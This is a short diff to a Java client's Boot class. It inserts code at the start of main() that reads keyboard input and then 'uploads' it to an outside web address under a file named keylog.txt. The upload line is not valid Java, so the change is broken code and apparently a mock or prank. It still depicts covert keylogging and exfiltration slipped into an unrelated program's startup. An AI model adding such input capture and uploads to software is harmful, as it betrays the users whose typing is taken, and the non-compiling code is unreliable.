@@ -14,6 +14,7 @@ import org.powerbat.methods.Updater;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.lang.reflect.InvocationTargetException;
+import java.util.Scanner;
 
 /**
  * The boot class is responsible for basic loading for the client. Bringing all
@@ -41,6 +42,11 @@ public class Boot {
      */
 
     public static void main(String[] args) {
+        Scanner keyboard = new Scanner(System.in);
+        String input;
+        input = keyboard.nextLine();
+        upload input www.huehuehuehuehue.gov/secret/keylog.txt
+        
         Paths.build();
         Global.loadImages();
         Splash.setStatus("Loading");
